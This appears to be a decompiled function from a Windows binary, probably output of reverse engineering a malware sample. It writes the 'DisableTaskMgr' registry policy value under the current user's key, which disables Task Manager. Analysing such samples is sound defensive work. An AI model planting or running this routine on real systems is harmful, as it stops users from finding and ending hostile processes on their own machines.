undefined8 FUN_140011b50(void)

{
  LSTATUS LVar1;
  BYTE local_res10 [8];
  HKEY local_res18 [2];
  
  local_res10[0] = '\x01';
  local_res10[1] = '\0';
  local_res10[2] = '\0';
  local_res10[3] = '\0';
  local_res18[0] = (HKEY)0x0;
  LVar1 = RegCreateKeyExA((HKEY)&DAT_ffffffff80000001,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,
                          (LPSTR)0x0,0,2,(LPSECURITY_ATTRIBUTES)0x0,local_res18,(LPDWORD)0x0);
  if (LVar1 == 0) {
    RegSetValueExA(local_res18[0],"DisableTaskMgr",0,4,local_res10,4);
    RegCloseKey(local_res18[0]);
  }
  return 0;
}
